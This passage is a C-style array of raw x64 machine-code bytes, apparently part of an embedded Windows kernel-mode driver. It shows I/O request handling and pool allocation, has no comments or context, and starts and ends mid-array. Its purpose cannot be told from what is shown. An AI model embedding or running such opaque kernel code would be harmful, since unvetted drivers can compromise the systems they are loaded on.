		0x45, 0x48, 0x89, 0x7C, 0x24, 0x28, 0x33, 0xFF, 0x48, 0x8D, 0x05, 0x59, 0x48, 0x00, 0x00, 0x8B, 0xD7, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x0F, 0x18, 0x88, 0xC0, 0x03, 0x00, 0x00, 0x48, 0x3B, 0x08, 0x74, 0x27, 0xFF, 0xC2, 0x48, 0x83,
		0xC0, 0x50, 0x81, 0xFA, 0x50, 0xC3, 0x00, 0x00, 0x72, 0xE6, 0x48, 0x8B, 0xD1, 0x48, 0x8D, 0x0D, 0xEC, 0x26, 0x00, 0x00, 0xE8, 0x07, 0xF6, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x28, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x81, 0xFA, 0x50, 0xC3, 0x00,
		0x00, 0x73, 0xDF, 0x48, 0x89, 0x5C, 0x24, 0x58, 0x8B, 0xC2, 0x48, 0x89, 0x74, 0x24, 0x30, 0x48, 0x8D, 0x1C, 0x80, 0x48, 0x8D, 0x35, 0xEE, 0x47, 0x00, 0x00, 0x48, 0x03, 0xDB, 0x48, 0x8B, 0x4C, 0xDE, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x06, 0xFF,
		0x15, 0x33, 0x37, 0x00, 0x00, 0x48, 0x89, 0x7C, 0xDE, 0x18, 0x48, 0x89, 0x7C, 0xDE, 0x10, 0x89, 0x7C, 0xDE, 0x28, 0x89, 0x7C, 0xDE, 0x2C, 0x48, 0x89, 0x7C, 0xDE, 0x20, 0x48, 0x89, 0x7C, 0xDE, 0x08, 0x48, 0x89, 0x7C, 0xDE, 0x30, 0x48, 0x89,
		0x7C, 0xDE, 0x38, 0x48, 0x89, 0x7C, 0xDE, 0x40, 0x48, 0x89, 0x7C, 0xDE, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xB1, 0x3C, 0xDE, 0x48, 0x8B, 0x74, 0x24, 0x30, 0x48, 0x8B, 0x5C, 0x24, 0x58, 0x48, 0x8B, 0x7C, 0x24, 0x28, 0x48, 0x83,
		0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x48, 0x89, 0x6C, 0x24, 0x38, 0x48, 0x89, 0x7C, 0x24, 0x48, 0x4C, 0x89, 0x64, 0x24, 0x20, 0x4D, 0x8B,
		0xE1, 0x49, 0x8B, 0xE8, 0x4C, 0x8B, 0xCA, 0x48, 0x8B, 0xF9, 0x0F, 0x84, 0xAE, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xA5, 0x00, 0x00, 0x00, 0x41, 0x8B, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x30, 0xBB, 0x04, 0x80, 0x6A, 0xC8, 0x85, 0xC0,
		0x0F, 0x84, 0x8C, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x45, 0x33, 0xC0, 0x49, 0x8B, 0xC9, 0x48, 0x89, 0x74, 0x24, 0x40, 0xFF, 0x15, 0x16, 0x37, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xDF, 0x26, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8B, 0xF0, 0xE8,
		0x04, 0xF5, 0xFF, 0xFF, 0x48, 0x85, 0xF6, 0x74, 0x41, 0x4D, 0x85, 0xE4, 0x75, 0x14, 0x48, 0x8D, 0x0D, 0x83, 0x26, 0x00, 0x00, 0x48, 0x8B, 0xD6, 0x48, 0x89, 0x37, 0xE8, 0xE8, 0xF4, 0xFF, 0xFF, 0xEB, 0x20, 0x8B, 0x55, 0x00, 0x4D, 0x8B, 0xC4,
		0x48, 0x8B, 0xCE, 0xE8, 0xD8, 0xF5, 0xFF, 0xFF, 0x48, 0x8D, 0x0D, 0x21, 0x26, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48, 0x89, 0x07, 0xE8, 0xC6, 0xF4, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x39, 0x07, 0x0F, 0x45, 0xD8, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x8B,
		0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x4C, 0x8B, 0x64, 0x24, 0x20, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x8B, 0xC3, 0xEB, 0xE3, 0x4C, 0x8B, 0x64, 0x24, 0x20, 0x48, 0x8B, 0x7C, 0x24, 0x48,
		0x48, 0x8B, 0x6C, 0x24, 0x38, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x48,
		0x89, 0x7C, 0x24, 0x48, 0x4C, 0x8B, 0xCA, 0x48, 0x8B, 0xF9, 0x0F, 0x84, 0x82, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x74, 0x7D, 0x41, 0x8B, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x38, 0xBB, 0x04, 0x80, 0x6A, 0xC8, 0x85, 0xC0, 0x74, 0x5B, 0x48, 0x8B,
		0xD0, 0x45, 0x33, 0xC0, 0x49, 0x8B, 0xC9, 0x48, 0x89, 0x74, 0x24, 0x40, 0xFF, 0x15, 0x2E, 0x36, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xF7, 0x25, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8B, 0xF0, 0xE8, 0x1C, 0xF4, 0xFF, 0xFF, 0x48, 0x85, 0xF6, 0x74,
		0x1A, 0x48, 0x8D, 0x0D, 0xA0, 0x25, 0x00, 0x00, 0x48, 0x8B, 0xD6, 0x48, 0x89, 0x37, 0xE8, 0x05, 0xF4, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x39, 0x07, 0x0F, 0x45, 0xD8, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48,
		0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x28,
		0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x89, 0x58, 0x18, 0x48, 0x8B, 0xDA, 0x33, 0xD2, 0x48, 0x89, 0x78, 0x20, 0x48, 0x8B, 0xF9, 0x44, 0x8D, 0x42, 0x40, 0x48, 0x8B, 0xCB, 0xE8, 0x6D,
		0x1A, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x66, 0xC7, 0x03, 0x40, 0x00, 0x66, 0xC7, 0x43, 0x02, 0x01, 0x00, 0xC7, 0x43, 0x08, 0xFF, 0xFF, 0xFF, 0xFF, 0xC7, 0x43, 0x0C, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x15,
		0x0C, 0x35, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x4C, 0x8D, 0x5C, 0x24, 0x40, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x4C, 0x89, 0x5C, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28, 0x41, 0x8D, 0x49, 0x1B, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0xD7, 0x48, 0xC7, 0x44,
		0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xD4, 0x34, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x4F, 0x48, 0x8B, 0x88, 0xB8, 0x00, 0x00, 0x00, 0xC7, 0x40, 0x30, 0xBB, 0x00, 0x00, 0xC0, 0x48, 0x8B, 0xD0, 0xC6, 0x41, 0xB8, 0x1B, 0xC6, 0x41,
		0xB9, 0x09, 0x48, 0x89, 0x59, 0xC0, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0xA1, 0x34, 0x00, 0x00, 0x3D, 0x03, 0x01, 0x00, 0x00, 0x75, 0x1C, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0xC7, 0x44, 0x24, 0x20,
		0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x76, 0x34, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x40, 0xEB, 0x05, 0xB8, 0x9A, 0x00, 0x00, 0xC0, 0x48, 0x8B, 0xBC, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4,
		0x78, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x81, 0xEC, 0x98, 0x00, 0x00, 0x00, 0x48, 0x89, 0x58, 0xF8, 0x48, 0x89, 0x68, 0xF0, 0x48, 0x89, 0x70, 0xE8, 0x48, 0x8B, 0xD9, 0x41, 0x0F, 0xB6, 0xF0, 0x48, 0x8B, 0xEA,
		0x48, 0x89, 0x78, 0xE0, 0x48, 0x8D, 0x48, 0xC0, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x41, 0x8B, 0xF9, 0xFF, 0x15, 0x32, 0x34, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x4C, 0x8D, 0x5C, 0x24, 0x48, 0x4C, 0x89, 0x5C, 0x24, 0x30, 0x48, 0x8D, 0x44, 0x24, 0x58,
		0x41, 0x8D, 0x49, 0x1B, 0x48, 0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0xD3, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xFA, 0x33, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x68, 0x48, 0x8B, 0x90, 0xB8, 0x00,
		0x00, 0x00, 0x48, 0x83, 0xEA, 0x48, 0x74, 0x5B, 0x8B, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0xC7, 0x40, 0x30, 0xBB, 0x00, 0x00, 0xC0, 0xC6, 0x02, 0x1B, 0x89, 0x4A, 0x20, 0x40, 0x88, 0x72, 0x01, 0x48, 0x89, 0x6A, 0x10, 0xC7, 0x42, 0x08, 0x00,
		0x00, 0x00, 0x00, 0x89, 0x7A, 0x18, 0x48, 0x8B, 0xCB, 0x48, 0x8B, 0xD0, 0xFF, 0x15, 0xAE, 0x33, 0x00, 0x00, 0x3D, 0x03, 0x01, 0x00, 0x00, 0x75, 0x26, 0x48, 0x8D, 0x4C, 0x24, 0x58, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0xC7,
		0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x83, 0x33, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x48, 0xEB, 0x04, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x7C, 0x24, 0x78, 0x48, 0x8B, 0xB4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xAC, 0x24,
		0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x98, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x4C, 0x8B, 0xDC, 0x48, 0x81, 0xEC, 0x18, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x87, 0x43, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xE0, 0x01, 0x00, 0x00, 0x49, 0x89, 0x5B, 0x10, 0x49, 0x89, 0x6B, 0x18, 0x49, 0x89, 0x7B, 0xF8, 0x48, 0x8B, 0x79,
		0x38, 0x4D, 0x89, 0x63, 0xF0, 0x48, 0x8B, 0xD9, 0x4D, 0x89, 0x73, 0xE0, 0x45, 0x33, 0xF6, 0x49, 0x8D, 0x8B, 0x88, 0xFE, 0xFF, 0xFF, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x40, 0x32, 0xED, 0x45, 0x8B, 0xE6, 0x45, 0x89, 0xB3, 0xD8, 0xFE, 0xFF, 0xFF,
		0xFF, 0x15, 0x02, 0x33, 0x00, 0x00, 0x4C, 0x8D, 0x9C, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x41, 0x8D, 0x4E, 0x1B, 0x4C, 0x89, 0x5C, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC9, 0x45,
		0x33, 0xC0, 0x48, 0x8B, 0xD7, 0x4C, 0x89, 0x74, 0x24, 0x20, 0xFF, 0x15, 0xC8, 0x32, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x64, 0x48, 0x8B, 0x90, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x83, 0xEA, 0x48, 0x74, 0x57, 0xC7, 0x40, 0x30, 0xBB, 0x00, 0x00,
		0xC0, 0x48, 0x8D, 0x8C, 0x24, 0xE0, 0x00, 0x00, 0x00, 0xC6, 0x02, 0x1B, 0x48, 0x89, 0x4A, 0x10, 0xC6, 0x42, 0x01, 0x0F, 0xC7, 0x42, 0x20, 0x40, 0x00, 0x00, 0x00, 0x44, 0x89, 0x72, 0x08, 0x44, 0x89, 0x72, 0x18, 0x48, 0x8B, 0xCF, 0x48, 0x8B,
		0xD0, 0xFF, 0x15, 0x79, 0x32, 0x00, 0x00, 0x3D, 0x03, 0x01, 0x00, 0x00, 0x75, 0x1B, 0x48, 0x8D, 0x8C, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x4C, 0x89, 0x74, 0x24, 0x20, 0xFF, 0x15, 0x4F, 0x32, 0x00,
		0x00, 0x48, 0x8D, 0x15, 0xE8, 0x22, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xAC, 0x24, 0x00, 0x02, 0x00, 0x00, 0xFF, 0x15, 0x22, 0x32, 0x00, 0x00, 0x48, 0x8D, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x4C, 0x8D,
		0x44, 0x24, 0x60, 0x48, 0x8D, 0x4C, 0x24, 0x48, 0xBA, 0x19, 0x00, 0x02, 0x00, 0x48, 0x89, 0x44, 0x24, 0x70, 0xC7, 0x44, 0x24, 0x60, 0x30, 0x00, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x68, 0xC7, 0x44, 0x24, 0x78, 0x40, 0x00, 0x00, 0x00, 0x4C,
		0x89, 0xB4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xB4, 0x24, 0x88, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x33, 0x32, 0x00, 0x00, 0x85, 0xC0, 0x44, 0x8B, 0xE8, 0x0F, 0x88, 0xC7, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xBC, 0x24, 0xF0, 0x01, 0x00, 0x00,
		0x41, 0xBF, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0xB4, 0x24, 0x38, 0x02, 0x00, 0x00, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8D, 0x44, 0x24, 0x40, 0x45, 0x33, 0xC9, 0x48, 0x89, 0x44,
		0x24, 0x28, 0x45, 0x8B, 0xC7, 0x41, 0x8B, 0xD4, 0x44, 0x89, 0x74, 0x24, 0x20, 0x40, 0x32, 0xFF, 0xFF, 0x15, 0xDA, 0x31, 0x00, 0x00, 0x8B, 0x54, 0x24, 0x40, 0x41, 0xB8, 0x44, 0x64, 0x6B, 0x20, 0x41, 0x8B, 0xCF, 0x48, 0x83, 0xC2, 0x08, 0xFF,
		0x15, 0x03, 0x31, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x40, 0x45, 0x8B, 0xC7, 0x48, 0x8B, 0xF0, 0x48, 0x8D, 0x44, 0x24, 0x40, 0x41, 0x8B, 0xD4, 0x48, 0x89, 0x44, 0x24, 0x28, 0x89, 0x4C, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x4C, 0x8B, 0xCE,
		0xFF, 0x15, 0x9A, 0x31, 0x00, 0x00, 0x85, 0xC0, 0x44, 0x8B, 0xE8, 0x79, 0x09, 0x41, 0x0F, 0xB6, 0xEF, 0xE9, 0x08, 0x01, 0x00, 0x00, 0x40, 0x84, 0xED, 0x0F, 0x85, 0xFF, 0x00, 0x00, 0x00, 0x83, 0x7E, 0x04, 0x08, 0x0F, 0x85, 0xF5, 0x00, 0x00,
		0x00, 0x48, 0x8D, 0x56, 0x14, 0x48, 0x8D, 0x8C, 0x24, 0x90, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x15, 0x31, 0x00, 0x00, 0x48, 0x8D, 0x94, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x45, 0x0F, 0xB6, 0xC7, 0xFF, 0x15, 0x46, 0x31,
		0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x48, 0x8D, 0x15, 0x92, 0x21, 0x00, 0x00, 0xFF, 0x15, 0x2C, 0x31, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xA3, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x48, 0x8D, 0x15, 0x67, 0x21, 0x00,
		0x00, 0xFF, 0x15, 0x11, 0x31, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x88, 0x00, 0x00, 0x00, 0x44, 0x8B, 0x46, 0x08, 0x4C, 0x03, 0xC6, 0x41, 0x83, 0x78, 0x04, 0x05, 0x75, 0x7A, 0x45, 0x8B, 0x50, 0x10, 0x45, 0x85, 0xD2, 0x74, 0x71, 0x44,
		0x8B, 0x8C, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x49, 0x8D, 0x48, 0x14, 0x49, 0x8B, 0xD2, 0x66, 0x90, 0x80, 0x39, 0x03, 0x75, 0x14, 0x44, 0x39, 0x49, 0x04, 0x75, 0x0E, 0x40, 0x0F, 0xB6, 0xC7, 0x40, 0x84, 0xFF, 0x41, 0x0F, 0x44, 0xC7, 0x0F, 0xB6,
		0xF8, 0x48, 0x83, 0xC1, 0x14, 0x48, 0xFF, 0xCA, 0x75, 0xDE, 0x41, 0x3A, 0xFF, 0x75, 0x39, 0x45, 0x85, 0xD2, 0x41, 0x8B, 0xD6, 0x74, 0x2E, 0x49, 0x8D, 0x48, 0x18, 0x80, 0x79, 0xFC, 0x02, 0x75, 0x18, 0x8B, 0x41, 0x04, 0x89, 0x43, 0x0C, 0x0F,
		0xB6, 0x01, 0x88, 0x43, 0x08, 0x48, 0x8B, 0x41, 0x08, 0x44, 0x89, 0x73, 0x18, 0x48, 0x89, 0x43, 0x10, 0xFF, 0xC2, 0x48, 0x83, 0xC1, 0x14, 0x41, 0x3B, 0x50, 0x10, 0x72, 0xD6, 0x41, 0x8A, 0xEF, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xFF, 0x15, 0x6D,
		0x30, 0x00, 0x00, 0x41, 0xFF, 0xC4, 0x48, 0x85, 0xF6, 0x74, 0x0B, 0x33, 0xD2, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0xBA, 0x2F, 0x00, 0x00, 0x40, 0x84, 0xED, 0x0F, 0x84, 0x69, 0xFE, 0xFF, 0xFF, 0x4C, 0x8B, 0xBC, 0x24, 0xF0, 0x01, 0x00, 0x00, 0x48,
		0x8B, 0xB4, 0x24, 0x38, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x4C, 0x8B, 0xB4, 0x24, 0xF8, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0xA4, 0x24, 0x08, 0x02, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x48, 0x8B, 0xBC, 0x24, 0x10, 0x02, 0x00, 0x00, 0x48,
		0x8B, 0xAC, 0x24, 0x30, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0x28, 0x02, 0x00, 0x00, 0x74, 0x06, 0xFF, 0x15, 0x01, 0x30, 0x00, 0x00, 0x41, 0x8B, 0xC5, 0x4C, 0x8B, 0xAC, 0x24, 0x00, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xE0, 0x01,
		0x00, 0x00, 0xE8, 0x29, 0x16, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x18, 0x02, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x8B, 0xDC, 0x48, 0x81, 0xEC, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xE7, 0x3F, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x49, 0x89, 0x5B, 0x18, 0x48,
		0x8B, 0x59, 0x38, 0x49, 0x89, 0x7B, 0x20, 0x48, 0x8B, 0xF9, 0x49, 0x8D, 0x4B, 0xB8, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x89, 0x44, 0x24, 0x68, 0x89, 0x44, 0x24, 0x6C, 0x89, 0x44, 0x24, 0x70, 0x89, 0x44, 0x24, 0x74, 0x89, 0x44, 0x24, 0x78, 0x89,
		0x44, 0x24, 0x7C, 0xFF, 0x15, 0x67, 0x2F, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x4C, 0x8D, 0x5C, 0x24, 0x40, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x4C, 0x89, 0x5C, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x28, 0x41, 0x8D, 0x49, 0x1B, 0x45, 0x33, 0xC0, 0x48,
		0x8B, 0xD3, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x2F, 0x2F, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x6A, 0x48, 0x8B, 0x90, 0xB8, 0x00, 0x00, 0x00, 0xC7, 0x40, 0x30, 0xBB, 0x00, 0x00, 0xC0, 0x48, 0x8B, 0xCB, 0xC6,
		0x42, 0xB8, 0x1B, 0xC6, 0x42, 0xB9, 0x15, 0x48, 0x8B, 0xD0, 0xFF, 0x15, 0x00, 0x2F, 0x00, 0x00, 0x3D, 0x03, 0x01, 0x00, 0x00, 0x75, 0x22, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0xC7, 0x44, 0x24,
		0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xD5, 0x2E, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x40, 0xEB, 0x07, 0x85, 0xC0, 0x0F, 0x44, 0x44, 0x24, 0x40, 0x85, 0xC0, 0x78, 0x14, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x33, 0xD2, 0x8B, 0x41, 0x14, 0x89, 0x44,
		0x24, 0x7C, 0xFF, 0x15, 0x38, 0x2E, 0x00, 0x00, 0xBA, 0x40, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x44, 0x64, 0x6B, 0x20, 0x8D, 0x4A, 0xC1, 0xFF, 0x15, 0x1C, 0x2E, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x74, 0x64, 0x33, 0xC0, 0x48, 0x8B,
		0xD3, 0x48, 0x89, 0x03, 0x48, 0x89, 0x43, 0x08, 0x48, 0x89, 0x43, 0x10, 0x48, 0x89, 0x43, 0x18, 0x48, 0x89, 0x43, 0x20, 0x48, 0x89, 0x43, 0x28, 0x48, 0x89, 0x43, 0x30, 0x48, 0x89, 0x43, 0x38, 0x48, 0x8B, 0x4F, 0x38, 0xE8, 0x27, 0xF9, 0xFF,
		0xFF, 0x44, 0x0F, 0xB6, 0x5C, 0x24, 0x7C, 0x33, 0xD2, 0x44, 0x88, 0x1F, 0x8B, 0x43, 0x08, 0xC1, 0xE8, 0x08, 0x33, 0x07, 0x25, 0x00, 0x1F, 0x00, 0x00, 0x31, 0x07, 0x8B, 0x4B, 0x08, 0x8B, 0x07, 0xC1, 0xE1, 0x0D, 0x33, 0xC8, 0x81, 0xE1, 0x00,
		0xE0, 0x00, 0x00, 0x33, 0xC8, 0x89, 0x0F, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xB8, 0x2D, 0x00, 0x00, 0x48, 0x8B, 0xBC, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8B, 0x8C, 0x24, 0x80, 0x00,
		0x00, 0x00, 0xE8, 0x71, 0x14, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x98, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x8B, 0xDC, 0x48, 0x81, 0xEC, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x47, 0x3E, 0x00,
		0x00, 0x48, 0x89, 0x44, 0x24, 0x58, 0x4D, 0x89, 0x6B, 0xE8, 0x4D, 0x89, 0x73, 0xE0, 0x45, 0x33, 0xF6, 0x4C, 0x8B, 0xE9, 0x4D, 0x8D, 0x4B, 0xA0, 0x45, 0x8D, 0x46, 0x01, 0x49, 0x8D, 0x4B, 0xC0, 0x33, 0xD2, 0xC7, 0x44, 0x24, 0x48, 0x44, 0x89,
		0x49, 0xAD, 0x66, 0xC7, 0x44, 0x24, 0x4C, 0x2F, 0x76, 0x66, 0xC7, 0x44, 0x24, 0x4E, 0xD0, 0x11, 0xC6, 0x44, 0x24, 0x50, 0x8D, 0xC6, 0x44, 0x24, 0x51, 0xCB, 0xC6, 0x44, 0x24, 0x52, 0x00, 0xC6, 0x44, 0x24, 0x53, 0xC0, 0xC6, 0x44, 0x24, 0x54,
		0x4F, 0xC6, 0x44, 0x24, 0x55, 0xC3, 0xC6, 0x44, 0x24, 0x56, 0x35, 0xC6, 0x44, 0x24, 0x57, 0x8C, 0x4D, 0x89, 0x73, 0x98, 0x4D, 0x89, 0x73, 0xA8, 0x4D, 0x89, 0x73, 0xA0, 0xFF, 0x15, 0xDE, 0x2D, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xDD, 0x01,
		0x00, 0x00, 0x48, 0x89, 0x9C, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x28, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0x48, 0x8B, 0xD3, 0xFF, 0x15, 0x4B, 0x2D, 0x00, 0x00, 0x44, 0x0F, 0xB7, 0x5C, 0x24, 0x38, 0x66, 0x45, 0x85, 0xDB, 0x0F,
		0x84, 0x9D, 0x01, 0x00, 0x00, 0x48, 0x89, 0xAC, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xB4, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xBC, 0x24, 0x80, 0x00, 0x00, 0x00, 0x4C, 0x89, 0x64, 0x24, 0x78, 0x66, 0x41, 0x83, 0xFB, 0x04, 0x0F,
		0x86, 0x2E, 0x01, 0x00, 0x00, 0x41, 0x0F, 0xB7, 0xD3, 0x66, 0x33, 0xC9, 0x83, 0xEA, 0x04, 0x85, 0xD2, 0x0F, 0x8E, 0x1C, 0x01, 0x00, 0x00, 0x90, 0x66, 0x83, 0xF9, 0x14, 0x0F, 0x83, 0x11, 0x01, 0x00, 0x00, 0x0F, 0xB7, 0xC1, 0x66, 0x83, 0x3C,
